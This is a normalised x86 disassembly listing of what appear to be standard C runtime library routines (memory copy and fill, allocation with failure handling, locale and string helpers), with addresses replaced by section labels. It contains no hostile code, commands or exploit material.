mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_404709
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_405d44
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_405ca5
push rw-data
call sub_405d23
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_405ccd
leave
retn
sub_405d76
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_405d44
mov [ rw-data ] 0x1
call sub_406250
pop ecx
sub_405da0
push 0x4
mov eax sub_413b1b
call sub_407aca
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_405ca5
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_408a41
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_405ccd
call sub_407b69
retn
mov ecx [ eax ]
call sub_404709
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_405e00
push 0x4
mov eax sub_413b1b
call sub_407aca
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_405ca5
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_405ce4
push esi
call sub_406807
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_405ccd
call sub_407b69
retn
sub_405e4e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_40aac8
pop ecx
pop ecx
sub_405e69
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
je r-xdata
and [ esi ] 0x0
test edi edi
je r-xdata
push eax
call sub_408a41
pop ecx
cmp [ edi ] 0x0
mov eax edi
je r-xdata
sub eax edi
push ebx
lea ebx [ eax + 0x1 ]
push ebx
call sub_40ac3c
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
pop ebx
push ebx
push edi
push eax
call sub_406330
add esp 0xc
sub_405ec1
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_40aac8
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_405e69
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_40aac8
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_405e69
pop esi
pop ebp
retn
sub_405f0e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_405e69
mov eax esi
pop esi
pop ebp
retn 0x4
sub_405f4d
push 0x4
mov eax sub_413af8
call sub_407aca
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_405da0
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
call sub_407b69
retn
push eax
call sub_408a41
pop ecx
sub_405f90
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_405f4d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_405fb1
push 0x4
mov eax sub_413b1b
call sub_407aca
mov eax [ rw-data ]
xor esi esi
mov edi eax
cmp eax esi
jne r-xdata
mov eax edi
call sub_407b69
retn
push esi
lea ecx [ ebp - 0x10 ]
call sub_405ca5
mov eax [ rw-data ]
mov [ ebp - 0x4 ] esi
mov edi eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_405ccd
push 0x20
call sub_406c0a
pop ecx
cmp eax esi
je r-xdata
push esi
mov edi esi
call sub_405d76
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_405e69
mov ecx esi
mov [ rw-data ] esi
call sub_4046df
mov eax [ rw-data ]
mov [ rw-data ] eax
push esi
mov ecx eax
call sub_405f0e
mov esi eax
sub_406040
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_406067
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_406040
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_406807
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_406807
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_4060ab
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x2
lea ecx [ ebp - 0x4 ]
call sub_405ca5
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x1
mov ecx [ eax + 0x8 ]
mov [ ecx * 4 + rw-data ] eax
mov eax [ eax + 0x8 ]
inc [ eax + rw-data ]
lea ecx [ ebp - 0x4 ]
call sub_405ccd
leave
retn
cmp ecx eax
je r-xdata
mov ecx [ eax + 0x8 ]
inc ecx
mov [ eax + 0x8 ] ecx
cmp ecx 0x8
jb r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
test ecx ecx
je r-xdata
sub_406100
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_406067
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_404769
push esi
call sub_406807
pop ecx
sub_40613e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_409ef3
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_409ecd
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_4099ff
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_409af8
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_4099b9
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_406250
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_40acd0
sub_4062ad
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_406c0a
push eax
mov [ esi ] eax
call sub_4062f0
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_406330
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4063b4 ]
jmp [ ecx * 4 + jump_table_406434 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4064a0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40663c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406540 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40663c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4064a0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40663c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4064a0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4064a0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4064a0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40663c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40663c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40663c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4066bb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_407a30
lea esi [ eax + 0x1 ]
push esi
call sub_40ac3c
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_40ae37
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_406719
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_4066bb
mov eax esi
pop esi
pop ebp
retn 0x4
sub_406740
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_4066fb
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_4066bb
jmp r-xdata
sub_406780
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_406719
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40679e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4066fb
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_4067c5
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_406740
mov eax esi
pop esi
pop ebp
retn 0x4
sub_406820
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4068a4 ]
jmp [ ecx * 4 + jump_table_406924 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406990 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_406b2c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406a30 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406b2c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406990 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_406b2c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406990 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406990 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_406990 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406b2c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406b2c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_406b2c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_406b90
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40ae96
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_406c0a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40ac3c
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40af5f
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_4067c5
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_406c8a
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_406691
push sub_413caf
mov [ rw-data ] esi
call sub_407d41
pop ecx
sub_406c8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
